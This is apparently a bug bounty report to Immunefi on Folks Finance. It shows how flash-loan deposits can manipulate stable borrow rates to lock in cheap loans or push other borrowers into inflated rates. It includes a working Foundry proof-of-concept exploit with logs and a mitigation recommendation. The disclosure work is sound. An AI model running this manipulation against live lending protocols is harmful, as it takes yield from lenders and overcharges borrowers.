# Boost \_ Folks Finance 33694 - \[Smart Contract - Medium] stableBorrowRates are manipulatable through

Submitted on Fri Jul 26 2024 15:07:59 GMT-0400 (Atlantic Standard Time) by @A2Security for [Boost | Folks Finance](https://immunefi.com/bounty/folksfinance-boost/)

Report ID: #33694

Report type: Smart Contract

Report severity: Medium

Target: <https://testnet.snowtrace.io/address/0xa9491a1f4f058832e5742b76eE3f1F1fD7bb6837>

Impacts:

* Protocol insolvency

## Description

## Title

## Description

We are going to focus on the simplest path. When a user wants to create a stable loan, he automatically recieves the stableInterestRate of the pool

```solidity
    function initLoanBorrowInterests(
        LoanManagerState.UserLoanBorrow storage loanBorrow,
        DataTypes.UpdateUserLoanBorrowParams memory params,
        bool isStable
    ) private {
        if (isStable) {
            loanBorrow.lastInterestIndex = MathUtils.ONE_18_DP;
@>            loanBorrow.stableInterestRate = params.poolStableInterestRate;
            loanBorrow.lastStableUpdateTimestamp = block.timestamp;
        } else {
            loanBorrow.lastInterestIndex = params.poolVariableInterestIndex;
            loanBorrow.stableInterestRate = 0;
            loanBorrow.lastStableUpdateTimestamp = 0;
        }
    }
```

The stableInterestRate is set to the pool stable interest rate. see `prepareForBorrow()`

```solidity
    function prepareForBorrow(
        HubPoolState.PoolData storage pool,
        uint256 amount,
        DataTypes.PriceFeed memory priceFeed,
        uint256 maxStableRate
    ) external returns (DataTypes.BorrowPoolParams memory borrowPoolParams) {
        if (pool.isDeprecated()) revert DeprecatedPool();

        bool isStable = maxStableRate > 0;
 @>       uint256 stableBorrowInterestRate = pool.stableBorrowData.interestRate;
```

This value is only updated when the function `HubPoolLogic.updateInterestRates()` is called generally at the end of each transaction that changes the state of a pool. For the example that is interesting for us it is called at the end of `updateWithDeposi()`

```solidity
    function updateWithDeposit(
        HubPoolState.PoolData storage pool,
        uint256 amount,
        DataTypes.PriceFeed memory priceFeed
    ) external returns (DataTypes.DepositPoolParams memory depositPoolParams) {
        if (pool.isDeprecated()) revert DeprecatedPool();
        if (pool.isDepositCapReached(priceFeed, amount)) revert DepositCapReached();

        // update interest indexes before the interest rates change
        pool.updateInterestIndexes();

        uint256 depositInterestIndex = pool.depositData.interestIndex;
        depositPoolParams.fAmount = amount.toFAmount(depositInterestIndex);
        depositPoolParams.depositInterestIndex = depositInterestIndex;
        depositPoolParams.priceFeed = priceFeed;

@>        pool.depositData.totalAmount += amount;
@>        pool.updateInterestRates();
    }
```

The stable rate is calculated using the curent **utilization rate, which could be lowered simply through depositing large amounts of collateral** or inflated **by increasing debt** (this could be used to force stable borrower to pay more rates by calling rebalanceUp() after attack to gain more yield as depositors)

```solidity
    function updateInterestRates(HubPoolState.PoolData storage poolData) internal {
        HubPoolState.PoolAmountDataCache memory poolAmountDataCache = getPoolAmountDataCache(poolData);
        uint256 totalDebt = poolAmountDataCache.variableBorrowTotalAmount + poolAmountDataCache.stableBorrowTotalAmount;
@>>        uint256 utilisationRatio = MathUtils.calcUtilisationRatio(totalDebt, poolData.depositData.totalAmount);
        uint32 vr1 = poolData.variableBorrowData.vr1;

        // calculate new interest rates
        uint256 variableBorrowInterestRate = MathUtils.calcVariableBorrowInterestRate(
            poolData.variableBorrowData.vr0,
            vr1,
            poolData.variableBorrowData.vr2,
            utilisationRatio,
            poolData.depositData.optimalUtilisationRatio
        );
        uint256 stableBorrowInterestRate = MathUtils.calcStableBorrowInterestRate(
            vr1,
            poolData.stableBorrowData.sr0,
            poolData.stableBorrowData.sr1,
            poolData.stableBorrowData.sr2,
            poolData.stableBorrowData.sr3,
@>>            utilisationRatio,
            poolData.depositData.optimalUtilisationRatio,
            MathUtils.calcStableDebtToTotalDebtRatio(poolAmountDataCache.stableBorrowTotalAmount, totalDebt),
            poolData.stableBorrowData.optimalStableToTotalDebtRatio
        );
```

As we can see the new calculation relays heavily on the current utilization ratio that relies on current total deposited amounts. This opens up the attack vectors for users to manipulating the utilization through large deposits right before locking themselves into a stable position

> please also note, the attackers could also simply manipulate the borrowrate to near the **rebalanceUpThreshold** or **rebalanceDownThreshold** so no one could call it and even if position get's rebalanced. Attackers could repeat same attack to get the desired lower borrow rate.

## Impact

We have found two major impacts, that caused by either manipulating rates up or down:

* Attackers could manipulate the stable borrow rate, to pay less interest rates which leads to a loss of yield for the protocol and the liquidity providers (lenders) and allow lenders to borrow at a disavantageous rate then the current market conditions
* Attackers could flashloan assets then borrow a large percentage, use the inflated stableRate to call rebalanceUp() on stableborrows, to force borrowers into inflated rates. This could be abused if the attacker has enough liquidity there to benefit from increase yield

## Recomendation

To mitigate this issue, similar protocols that offer both variable and stable rates rely on time averaged total deposits + total debts in order to calculate the stable rates. Another possible fix is to block same block deposits and withdrawals, this however wouldn't protect against the case when the liquidity used for the manipulation is bootstrapped by a whale account

## Proof of concept

### Proof Of Concept

We have provide a coded proof of concept for the first scenario, the second scenario is also the same because it has same root cause (**stable rate calculation relies on spot data, which is manipulatable through flash actions**) The attacker wants to borrow USDC at a lowered intersest rate:

• Attacker prepares a large amount of collateral tokens for his intended borrow

• Attacker takes out a flash loan for USDC (or simply an amount he have if he is a whale) and deposit it to the usdc hubpool (in the hub chain so it can be in same transaction)

• This deposit into the lending pool, artificially lowers the utilization ratio, and as a consequence lowers the stable borrow rate

• Immediately after depositing, attacker takes out a stable rate loan, locking in the artificially low interest rate

• Attacker repays the flash loan

• Attacker now has a stable rate loan at a much lower interest rate than should be available based on true utilization

• Attacker can repeat this process to continually refinance at artificially low rates (if after some time he gets rebalanced)

For the coded Poc, please follow the following steps: first create the first file: `test/pocs/base_test.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "@forge-std/Test.sol";
import "contracts/hub/Hub.sol";
import "contracts/spoke/SpokeToken.sol";
import "contracts/spoke/SpokeCommon.sol";
import "contracts/hub/HubPool.sol";
import "contracts/hub/LoanManager.sol";
import "contracts/bridge/libraries/Messages.sol";
import "contracts/hub/AccountManager.sol";
import "contracts/bridge/BridgeRouter.sol";
import "contracts/bridge/HubAdapter.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract baseTest is Test {
    using SafeERC20 for address;
    // Hub public hub;

    uint256 mainnetFork;
    bytes32 public constant PREFIX = "HUB_ADAPTER_V1";
    address constant HUB_ADDRESS = 0xaE4C62510F4d930a5C8796dbfB8C4Bc7b9B62140; // Assuming this is the Hub address
    address constant SPOKE_COMMON = 0x6628cE08b54e9C8358bE94f716D93AdDcca45b00;
    address constant SPOKE_USDC = 0x89df7db4af48Ec7A84DE09F755ade9AF1940420b;
    address constant HUBPOOL_USDC = 0x1968237f3a7D256D08BcAb212D7ae28fEda72c34;
    address constant HUBPOOL_AVAX = 0xd90B7614551E799Cdef87463143eCe2efd4054f9;
    address constant SPOKE_AVAX = 0xBFf8b4e5f92eDD0A5f72b4b0E23cCa2Cc476ce2a;
    address constant LOAN_MANAGER = 0x2cAa1315bd676FbecABFC3195000c642f503f1C9;
    address constant ACCOUNT_MANAGER = 0x3324B5BF2b5C85999C6DAf2f77b5a29aB74197cc;
    address constant USDC_TOKEN = 0x5425890298aed601595a70AB815c96711a31Bc65;
    address constant ADAPTER = 0xf472ab58969709De9FfEFaeFFd24F9e90cf8DbF9;
    address constant LISTING_ROLE = 0x16870a6A85cD152229B97d018194d66740f932d6;
    uint16 constant STABELE_LOAN_TYPE_ID = 1;
    uint16 constant VARIABLE_LOAN_TYPE_ID = 2;
    uint16 constant CHAIN_ID = 1; // Assuming Ethereum mainnet

    Hub hub;
    SpokeCommon spokeCommon;
    AccountManager accountManager;
    SpokeToken spokeUsdc;
    SpokeToken spokeAvax;
    HubPool hubPoolUsdc;
    HubPool hubPoolAvax;
    LoanManager loanManager;
    HubAdapter adapter;
    Messages.MessageParams DUMMY_MESSAGE_PARAMS = Messages.MessageParams({adapterId: 1, returnAdapterId: 1, receiverValue: 0, gasLimit: 0, returnGasLimit: 0});
    ///// users account ids :
    address bob = makeAddr("bob");
    address alice = makeAddr("alice");
    bytes32 bobAccountId;
    bytes32 aliceAccountId;
    bytes32[] bobLoanIds;
    bytes32[] aliceLoanIds;

    function setUp() public {
        // Fork Avalanche mainnet
        mainnetFork = vm.createFork("https://api.avax-test.network/ext/bc/C/rpc", 35000569);
        vm.selectFork(mainnetFork);

        // Initialize contracts
        hub = Hub(HUB_ADDRESS);
        spokeCommon = SpokeCommon(SPOKE_COMMON);
        spokeUsdc = SpokeToken(SPOKE_USDC);
        spokeAvax = SpokeToken(SPOKE_AVAX);
        hubPoolUsdc = HubPool(HUBPOOL_USDC);
        hubPoolAvax = HubPool(HUBPOOL_AVAX);
        loanManager = LoanManager(LOAN_MANAGER);
        accountManager = AccountManager(ACCOUNT_MANAGER);
        adapter = HubAdapter(ADAPTER);
        // create account ids for bob and alice :
        address[] memory _users = new address[](2);
        _users[0] = bob;
        _users[1] = alice;
        bytes32[] memory ids = _createAccounts(_users);
        bobAccountId = ids[0];
        aliceAccountId = ids[1];
        // create loanids for alice and bob :
        bobLoanIds.push(_createLoan(bobAccountId, bob, 1, VARIABLE_LOAN_TYPE_ID));
        aliceLoanIds.push(_createLoan(aliceAccountId, alice, 1, VARIABLE_LOAN_TYPE_ID));
        // credit bob and alice with 1M usdc and 1000 avax each :
        deal(USDC_TOKEN, bob, 1e12);
        deal(USDC_TOKEN, alice, 1e12);
        vm.deal(bob, 100000e18);
        vm.deal(alice, 100000e18);
    }
    ////////////////////////////////////// helpers ///////////////////////////////////////////

    function _creditAvax(address to, uint256 amount) internal {
        vm.deal(to, amount);
    }

    function _creditUsdc(address to, uint256 amount) internal {
        deal(USDC_TOKEN, to, amount);
    }

    function _approveUsdc(address from, address to, uint256 amount) internal {
        vm.prank(from);
        IERC20(USDC_TOKEN).approve(to, amount);
    }

    function _createAccounts(address[] memory users) internal returns (bytes32[] memory) {
        bytes32 id;
        bytes32[] memory ids = new bytes32[](users.length);
        for (uint256 i = 0; i < users.length; i++) {
            id = keccak256(abi.encode(i, "testing"));
            vm.prank(users[i]);
            spokeCommon.createAccount(DUMMY_MESSAGE_PARAMS, id, "");
            assertTrue(accountManager.isAccountCreated(id));
            ids[i] = id;
        }
        return ids;
    }

    function _createLoan(bytes32 accId, address _sender, uint256 nonce, uint16 _loanType) internal returns (bytes32) {
        bytes32 loanId = keccak256(abi.encode(accId, nonce, "loan"));
        uint16 loanType = _loanType;
        bytes32 loanName = keccak256(abi.encode(loanId, loanType));
        // create the loan :
        vm.prank(_sender);
        spokeCommon.createLoan(DUMMY_MESSAGE_PARAMS, accId, loanId, loanType, loanName);
        // check if the loan is created :
        assertTrue(loanManager.isUserLoanActive(loanId));
        return loanId;
    }

    function _createLoanAndDeposit(bytes32 _accountId, address sender, uint256 nonce, uint16 loanType, uint256 _amount, SpokeToken spoke) internal {
        bytes32 loanId = keccak256(abi.encode(_accountId, nonce, "loan"));
        uint16 loanTypeId = loanType; // or VARIABLE_LOAN_TYPE_ID
        bytes32 loanName = keccak256(abi.encode(loanId, loanTypeId));

        vm.prank(sender);
        spoke.createLoanAndDeposit(DUMMY_MESSAGE_PARAMS, _accountId, loanId, _amount, loanTypeId, loanName);
    }

    function _createLoanAndDeposit(bytes32 _accountId, address sender, bytes32 _loanId, uint16 loanType, uint256 _amount, SpokeToken spoke) internal {
        bytes32 loanId = _loanId;
        uint16 loanTypeId = loanType; // or VARIABLE_LOAN_TYPE_ID
        bytes32 loanName = keccak256(abi.encode(loanId, loanTypeId));

        vm.prank(sender);
        spoke.createLoanAndDeposit(DUMMY_MESSAGE_PARAMS, _accountId, loanId, _amount, loanTypeId, loanName);
    }

    function _borrowVariable(address sender, bytes32 _accountId, bytes32 _loanId, uint8 _poolId, uint256 _amount) internal {
        _borrow(sender, _accountId, _loanId, _poolId, _amount, 0);
    }

    function _borrowStable(address sender, bytes32 _accountId, bytes32 _loanId, uint8 _poolId, uint256 _amount, uint256 _maxStableRate) internal {
        _borrow(sender, _accountId, _loanId, _poolId, _amount, _maxStableRate);
    }

    function _borrow(address sender, bytes32 _accountId, bytes32 _loanId, uint8 _poolId, uint256 _amount, uint256 _maxStableRate) internal {
        vm.prank(sender);
        spokeCommon.borrow(DUMMY_MESSAGE_PARAMS, _accountId, _loanId, _poolId, CHAIN_ID, _amount, _maxStableRate);
    }

    function _deposit(address sender, bytes32 _accountId, bytes32 _loanId, uint256 _amount, SpokeToken spoke) internal {
        vm.prank(sender);
        spoke.deposit(DUMMY_MESSAGE_PARAMS, _accountId, _loanId, _amount);
    }

    function _depositAvax(address sender, bytes32 _accountId, bytes32 _loanId, uint256 _amount) internal {
        vm.prank(sender);
        spokeAvax.deposit{value: _amount}(DUMMY_MESSAGE_PARAMS, _accountId, _loanId, _amount);
        // spoke.deposit(DUMMY_MESSAGE_PARAMS, _accountId, _loanId, _amount);
    }

    function _withdraw(address sender, bytes32 _accountId, bytes32 _loanId, uint8 _poolId, uint256 _amount, bool isFAmount) internal {
        vm.prank(sender);
        spokeCommon.withdraw(DUMMY_MESSAGE_PARAMS, _accountId, _loanId, _poolId, CHAIN_ID, _amount, isFAmount);
    }

    function _repay(bytes32 _accountId, bytes32 _loanId, uint256 _amount, SpokeToken spoke, uint256 maxOverRepayment) internal {
        vm.prank(bob);
        spoke.repay(DUMMY_MESSAGE_PARAMS, _accountId, _loanId, _amount, maxOverRepayment);
    }

    function _getMsgId() internal view returns (bytes32) {
        uint256 s = adapter.sequence();
        return keccak256(abi.encodePacked(PREFIX, s));
    }

    function _checkSeccuss(bytes32 msgId) internal {
        vm.expectEmit();
        emit BridgeRouter.MessageSucceeded(1, msgId);
    }

    function _checkMessageSeccuss() internal {
        // vm.exepctEmit(true,false,false);
        // emit BridgeRouter.MessageSuccess(0,"");
    }
}


```

then please add the file that includes the poc to `test/pocs/manipulateStableRatePoC.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "./base_test.sol";
import "@forge-std/console.sol";

contract Pocs is baseTest {
    function _getStableRateUsdc() internal returns (uint256) {
        HubPoolState.StableBorrowData memory stableData = hubPoolUsdc.getStableBorrowData();
        return stableData.interestRate;
    }

    function test_ManipulateStableBorrowRateThrough() public {
        // initialize caps
        vm.startPrank(LISTING_ROLE);
        loanManager.updateLoanPoolCaps(1, hubPoolUsdc.getPoolId(), 100000e6, 10000e6);
        hubPoolUsdc.updateCapsData(HubPoolState.CapsData(type(uint64).max, type(uint64).max, 1e18));
        loanManager.updateLoanPoolCaps(2, hubPoolUsdc.getPoolId(), 100000e6, 10000e6);
        vm.stopPrank();
        // initialize pool with variable borrows
        uint256 bobDeposit = 20000e6; // 20 USDC
        _approveUsdc(bob, address(spokeUsdc), bobDeposit);
        _deposit(bob, bobAccountId, bobLoanIds[0], bobDeposit, spokeUsdc);

        _borrowVariable(bob, bobAccountId, bobLoanIds[0], hubPoolUsdc.getPoolId(), 10000e6);
        vm.warp(block.timestamp + 2 weeks);
        console.log("POOL + Borrows initialized + time has passed");
        //
        console.log("Initial borrowstableRate of pool :", _getStableRateUsdc());

        // @audit deposit large amount, for example using flash loan
        uint256 largeUsdcDeposit = 100000e6; // 1 million USDC
        _approveUsdc(alice, address(spokeUsdc), largeUsdcDeposit);
        _deposit(alice, aliceAccountId, aliceLoanIds[0], largeUsdcDeposit, spokeUsdc);
        console.log("Start Attack by performing large USDC deposit through flashLoan");

        console.log("borrowstableRate after deposit   :", _getStableRateUsdc());

        console.log("start the stable borrow");
        // Deposit avax as coll for alice
        _depositAvax(alice, aliceAccountId, aliceLoanIds[0], 2000e18);

        // Perform a stable borrow of 1000 USDC
        uint256 stableBorrowAmount = 1000e6; // 1000 USDC
        uint256 maxStableRate = 1e18; // Adjust as needed

        _borrowStable(
            alice,
            aliceAccountId,
            aliceLoanIds[0],
            hubPoolUsdc.getPoolId(),
            stableBorrowAmount,
            _getStableRateUsdc() * 2
        );

        (
            bytes32 accountId,
            uint16 loanTypeId,
            uint8[] memory colPools,
            uint8[] memory borPools,
            LoanManagerState.UserLoanCollateral[] memory colls,
            LoanManagerState.UserLoanBorrow[] memory borrows
        ) = loanManager.getUserLoan(aliceLoanIds[0]);

        console.log("borrowstableRate of loan         :", borrows[0].stableInterestRate);
        // Attacker now withdraws the excess large liquidity he deposited to manipulate utilization ratio
        // Withdraw the large USDC deposit
        _withdraw(alice, aliceAccountId, aliceLoanIds[0], hubPoolUsdc.getPoolId(), largeUsdcDeposit, false);

        console.log("Stable USDC rate after withdrawal:", _getStableRateUsdc());
    }
}

```

to execute the poc, please run `forge test --mt test_ManipulateStableBorrowRateThrough -vvv` This is the expected result, after running the poc, in a terminal

```log
Ran 1 test for test/pocs/manipulateStableRatePoC.sol:Pocs
[PASS] test_ManipulateStableBorrowRateThrough() (gas: 2824202)
Logs:
  POOL + Borrows initialized + time has passed
  Initial borrowstableRate of pool : 80996227465354582
  Start Attack by performing large USDC deposit through flashLoan
  borrowstableRate after deposit   : 72118961254591337
  start the stable borrow
  borrowstableRate of loan         : 72118961254591337
  Stable USDC rate after withdrawal: 81981978627936564

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 513.01ms (16.62ms CPU time)

Ran 1 test suite in 516.42ms (513.01ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
